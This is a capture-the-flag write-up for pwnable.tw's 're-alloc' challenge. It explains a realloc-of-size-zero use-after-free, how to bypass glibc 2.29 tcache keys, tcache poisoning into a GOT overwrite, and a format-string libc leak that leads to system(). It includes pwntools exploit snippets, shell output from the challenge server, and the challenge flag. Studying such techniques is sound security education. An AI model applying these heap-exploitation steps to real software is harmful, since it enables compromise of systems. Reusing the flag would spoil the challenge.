# re-alloc

UAF into tcache poisoning, Format String, GOT Overwrite

## checksec

```python
[*] '/mnt/d/CTFs/pwnable-tw/re-alloc/re-alloc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

We can overwrite the GOT with PLT addresses without a leak. 

## Overview of Binary & Vulnerability

The binary allows us to alloc, realloc (to change the size of) and free chunks. The main issue is that in the function to realloc chunks, `reallocate`, 

1. there is no check preventing us from realloc-ing a chunk of size 0, and
2. as we would expect for a realloc for a positive size, the pointer to the realloc-ed chunk is preserved. 

Now, the [man page for realloc](https://linux.die.net/man/3/realloc) states that

> The realloc() function changes the size of the memory block pointed to by ptr to size bytes. The contents will be unchanged in the range from the start of the region up to the minimum of the old and new sizes. If the new size is larger than the old size, the added memory will not be initialized. If ptr is NULL, then the call is equivalent to malloc(size), for all values of size; **if size is equal to zero, and ptr is not NULL, then the call is equivalent to free(ptr)**. Unless ptr is NULL, it must have been returned by an earlier call to malloc(), calloc() or realloc(). If the area pointed to was moved, a free(ptr) is done.

which means that if we can call `realloc` with size 0 twice on the same pointer (with some caveats that will be discussed later), we'd essentially have achieved double-free into the tcache! 

We will see later, however, that due to tcache double-free protections, we end up just using UAF (which would've been required to bypass the tcache double-freeing protections anyways) to perform tcache poisoning, and thus obtain arb-write capability. 

Looking into a short snipplet of the decompiled code from that function, and knowing that `realloc` with size 0 i.e. `free` returns nothing (i.e. rax will be 0), 

```c
0040155c              int64_t rax_10 = realloc(*(uint64_t*)((rax_2 << 3) + &heap), bytes);
0040156a              if (rax_10 != 0)
0040156a              {
00401591                  *(uint64_t*)((rax_2 << 3) + &heap) = rax_10;
004015a1                  printf("Data:");
004015c8                  rax_7 = read_input(*(uint64_t*)((rax_2 << 3) + &heap), bytes);
0040156a              }
0040156a              else
0040156a              {
00401573                  rax_7 = puts("alloc error");
0040156a              }
```

we see that a free is achieved without deleting the pointer to the chunk. This creates the basic conditions for us to investigate both double-freeing and UAF possibilities. 

> NOTE: There is an additional vulnerability in the binary where, in the function to alloc free chunks, there is an off-by-null - however, this is not required for this challenge. I think that this vulnerability will probably need to be used for the re-alloc revenge challenge. 

## Attempt 1: Double Freeing into the tcache

### What are tcache keys?

In this version of glibc (2.29), the tcache double-freeing protection isn't something that is overcome as easily as freeing another chunk into the tcache before double-freeing the original chunk. Instead, each `tcache_entry` struct (that occupies the user data space in the chunk once it is freed into the tcache) has an additional data field `key` that is a pointer to the thread's `tcache_perthread_struct`. 

```
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;
```

If a chunk that is to be freed into the tcache has its `key` field equal to the addr of the thread's `tcache_perthread_struct`, then `free` will check through the entirety of that tcache bin to see if any of the chunks in the bin have the same address that the one that is about to be freed. This explanation is probably hard to visualize - you can read the source code for this functionality [here](https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L4189). 

Also, a more detailed explanation of this protection can be found [here](https://ir0nstone.gitbook.io/notes/binexp/heap/tcache-keys). 

As mentioned on that page, we can bypass this protection overwrite by overwriting the `key` field by way of a UAF primitive. However, I soon realized that the UAF allows us to poison the tcache directly...

## Using the UAF primitive to tcache-poison

### Where's our UAF primitive?

Our UAF primitive comes from, after freeing and maintaining a pointer to the freed chunk through a realloc of 0 bytes, realloc-ing the same chunk but with the its size (i.e. so a realloc with no size change). In the function provided by binary (the decompiled code was shown in the [Overview of Binary & Vulnerability](#overview-of-binary--vulnerability) section), after the realloc, we are allowed to write data to the chunk. 

Since a realloc for the same size returns that very same chunk, we essentially have write capability into a freed chunk!

Here's some Python that illustrates this

```python
# We first free a chunk into the tcache and use the UAF prmitive to directly overwrite its next ptr
# The size of the chunks are arbitrary but should be the same throughout so that the same tcache bin is accessed
alloc(0, 0x38, b'A'*0x38)
realloc(0, 0, b'') # Free while retaining pointer    
realloc(0, 0x38, p64(exe.got.atoll) + b'A'*0x30) # Use the UAF primitive to overwrite the next ptr in the freed chunk
```

Notably, we aren't going to need to double-free (and deal with bypassing protections) anymore to write into a freed chunk - this UAF primitive does it for us. 

### Achieving arb-write

Based on what was set up in the tcache above, if we alloc a chunk of user data size 0x38 twice, we'd have arb-write to that memory location. We only have 1 free element in the chunk pointer array (its symbol in the binary is `heap`) in the bss, so we need to do a bit of finnicking to get this down

```python
# We still have the tcache entry in the tcache_perthread_struct, so we alloc/realloc this away to the other index of the chunk pointer array
# This will force the addr we want to write to (which was the next ptr) to be placed in the tcache_perthread_struct for the next alloc
alloc(1, 0x38, b'A'*0x38)
# Now, we cannot easily alloc again because the function (in the binary) will fail since both entries in the chunk pointer array are non-null
# Thus, we will need to perform the following to get arb-write: 
# 1. Realloc the chunk to a smaller size to split it into two chunks, where one is used and one is freed
# 2. Free this smaller chunk (so that it doesn't go into the tcache bin of our orginal size)
# 3. Alloc a chunk of our original size
# This will allocate a new chunk of the original size so that arb-write is achieved
realloc(1, 0x10, b'A'*0x10)
free(1)
alloc(1, 0x38, p64(exe.plt.printf))
```

This would have written the PLT entry of printf of the program into the GOT entry of atoll. 

## Concept of Exploit

Given our arb-write capability, as well as the internals of the binary, the concept of our exploit is to
1. Overwrite the GOT entry of atoll with the PLT entry of printf
2. Use a format string vuln to leak the libc base addr
3. Overwrite the GOT entry of atoll with the address of libc system

## Tweaks to our arb-write Implementation

Given the concept above, we need to make a few tweaks to our arb-write implementation. 

### No. of arb-writes required through tcache poisoning

Since the format string vulnerability writes into a buffer that is only 16 bytes big, it is not possible to even attempt a byte-by-byte write of integer granularity since, if the no. of chars is a 3-digit base 10 number, we will exceed the buffer size

```python
# Length 17 payload that would write c8 00 00 00 into addr
b'%200c%9$n' + p64(addr)
```

Thus, we actually need 2 tcache poisoning-enabled arb-writes. However, if we perform one arb-write, we corrupt one entry of the array (in bss) of entries that point to chunks on the heap with the addr we wrote to. Recall that we needed 2 indexes (and only have 2) to perform the arb-write. 

Thankfully, we only corrupt an entry in the array when actually allocating the chunk for the arb-write. To avoid locking ourselves out of a second arb-write, we can setup both arb-writes before actually performing any arb-writes.

### Setting up both arb-writes before performing them

In [Achieving arb-write](#achieving-arb-write), we poisoned the tcache bin for chunks of size 0x40 to perform the arb-write. 

Now, instead of immediately actualizing the arb-write by allocating, we only set-up the relevant tcache bin, before doing some cleanup so that the entry at index 0 of the `heap` bss array is zeroed so that the setup can be repeated (but now with a different chunk size so that a different tcache bin is targeted). 

```python
# From the "Achieving arb-write" section, without the alloc
realloc(1, 0x10, b'A'*0x10)
free(1)

# Cleanup so that index 0 can be allocated to again, and increment num_writes_setup
realloc(0, 0x10, b'A'*0x10) # This actually overwrites the tcache key so that libc does not detect a double-free
free(0)
```

We just need to make sure that we use a different tcache bin for each arb-write setup. I personally just used the chunk sizes 0x40 and 0x50. 

The rest of the implementation can be found in the [solve script](./solve.py). 

## Flag

```bash
[+] Opening connection to chall.pwnable.tw on port 10106: Done
[*] hex(libc.address)='0x7f6a87925000'
[*] Switching to interactive mode
$ cd home
$ ls
re-alloc
$ cd re-alloc
$ ls
flag
re-alloc
run.sh
$ cat flag
FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
```